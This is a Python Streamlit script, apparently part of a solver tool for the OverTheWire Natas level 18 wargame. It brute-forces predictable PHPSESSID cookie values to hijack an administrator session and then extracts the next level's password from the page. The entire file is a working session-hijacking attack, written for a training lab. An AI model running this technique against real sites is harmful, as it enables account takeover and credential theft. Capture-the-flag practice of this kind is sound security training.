import streamlit as st
import re

def run(context, session, base_url):
    st.info("Targeting Predictable Session ID Tracking via identifier value tracking...")
    
    # 1. Establish baseline target credentials for Level 18
    username = "natas18"
    current_password = context.get('password', '').strip()
    session.auth = (username, current_password)
    
    # Define search space for the session ID brute force
    max_session_ids = 640
    st.write(f"🔄 Commencing session space sweep (Range: 1 to {max_session_ids})...")
    
    progress_bar = st.progress(0)
    status_display = st.empty()
    
    # 2. Iterate through predictable session identifiers
    for i in range(1, max_session_ids + 1):
        # Update UI feedback controls
        progress_bar.progress(i / max_session_ids)
        if i % 20 == 0 or i == 1:
            status_display.text(f"Testing session ID profile index: {i}")
            
        # Set the tracking cookie directly in the requests session container
        session.cookies.set("PHPSESSID", str(i), domain=".natas.labs.overthewire.org", path="/")
        
        try:
            # Send a simple GET request to check the status of this session ID
            response = session.get(base_url, timeout=5)
            
            # Look for the indicator that we successfully hijacked an admin session
            if "You are an admin" in response.text:
                status_display.empty()
                st.success(f"🎯 Target administrative session matched successfully at ID: `{i}`!")
                
                # Find ALL 32-character or 64-character tokens on the page
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b|\b[A-Za-z0-9]{64}\b', response.text)
                
                # Filter out the current level's password to isolate the new flag
                new_tokens = [t for t in all_tokens if t != current_password]
                
                if new_tokens:
                    st.code(f"Natas 19 Password: {new_tokens[0]}")
                else:
                    st.warning("Admin session accessed, but no unique password string signature was found.")
                    with st.expander("Examine Page Content Payload"):
                        st.code(response.text, language="html")
                return
                
        except Exception as e:
            st.error(f"Connection error at loop index {i}: {str(e)}")
            return
            
    st.error("Sweep finished completely but no administrative privilege elevation indicators were logged.")